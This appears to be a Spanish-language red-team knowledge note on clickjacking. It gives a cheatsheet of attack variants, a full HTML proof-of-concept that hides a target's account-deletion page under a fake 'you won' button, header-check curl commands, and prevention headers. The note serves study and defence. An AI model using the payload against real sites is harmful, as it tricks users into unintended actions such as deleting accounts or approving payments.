---
aliases:
  - UI Redress
  - Clickjacking
tags:
  - type/vulnerability
  - vuln/clickjacking
  - technique/initial-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: Vulnerability
linked:
---
# Clickjacking

***

## Cheatsheet

| **Escenario**                          | **Detección**                                                                              | **PoC**                                                                   |
| -------------------------------------- | ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------- |
| **Falta de header X-Frame-Options**    | `curl -sI https://target/` — no aparece `X-Frame-Options` ni `Content-Security-Policy: frame-ancestors`. | iframe del target en página atacante → renderiza.                         |
| **CSP frame-ancestors permisivo**      | `CSP: frame-ancestors *` o ausente                                                          | Permite embed desde cualquier origen.                                     |
| **Bypass via sandbox attribute**       | `<iframe sandbox>`                                                                          | Remueve protecciones JavaScript anti-frame, útil para payload con interacción.|
| **Target soporta iframes con opacity** | Botón/form crítico en posición predecible                                                   | Overlay opacity 0 + z-index con captura de clicks.                        |
| **Drag-and-drop Clickjacking**         | Datos sensibles en campos inputs                                                            | `ondragstart` exfiltra el contenido arrastrado.                           |
| **Cursor-jacking**                     | UX confuso                                                                                  | CSS `cursor: none` + cursor falso desplazado → usuario clickea donde cree.|

## PoC estándar

```html
<!DOCTYPE html>
<html>
<head>
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.00001;
    z-index: 2;
  }
  .decoy {
    position: absolute;
    top: 300px; left: 200px;
    z-index: 1;
    background: red; color: white;
    padding: 20px; font-size: 24px;
  }
</style>
</head>
<body>
  <div class="decoy">¡GANASTE! Click aquí</div>
  <iframe src="https://target.com/admin/delete-account"></iframe>
</body>
</html>
```

## Identificación rápida

```bash
# Check headers
curl -sI https://target.com/ | grep -iE 'x-frame-options|content-security-policy'

# Si no aparece ninguno → probablemente vulnerable
# Si aparece "X-Frame-Options: SAMEORIGIN" o "DENY" → bloqueado
# Si aparece "CSP: ... frame-ancestors 'self'" → bloqueado
# Si aparece "CSP: ... frame-ancestors *" → vulnerable
```

## Overview

**Clickjacking** es una técnica de UI redressing donde un atacante superpone una página víctima (cargada en iframe) sobre una interfaz atacante, engañando al usuario para que ejecute acciones no intencionadas (submit de forms, transferencias, cambios de configuración).

### Vectores de impacto

- Confirmación de transferencias bancarias o pagos.
- Cambios de password sin interacción explícita.
- Posting en redes sociales.
- Habilitación de cámaras/micrófonos en WebRTC.
- Framing de formularios OAuth para robo de consentimiento.

### Prevención

```http
X-Frame-Options: DENY
# o
X-Frame-Options: SAMEORIGIN

# Mejor, usar CSP moderna:
Content-Security-Policy: frame-ancestors 'self'
# o
Content-Security-Policy: frame-ancestors 'none'
```

- **CSP `frame-ancestors`** es el estándar moderno, obsoleta a `X-Frame-Options`.
- Frame busting por JavaScript (`if (top != self) top.location = self.location`) es **bypasseable** con `sandbox`.
- SameSite cookies ayudan indirectamente (si la acción requiere cookie y está en `SameSite=Strict`, el iframe cross-origin no la envía).

## Notas relacionadas

- [[Cross-Site Scripting (XSS)]] — clickjacking + XSS = exploit más potente.
- [[Cross-Site Request Forgery (CSRF)]] — técnica análoga sin UI.

***
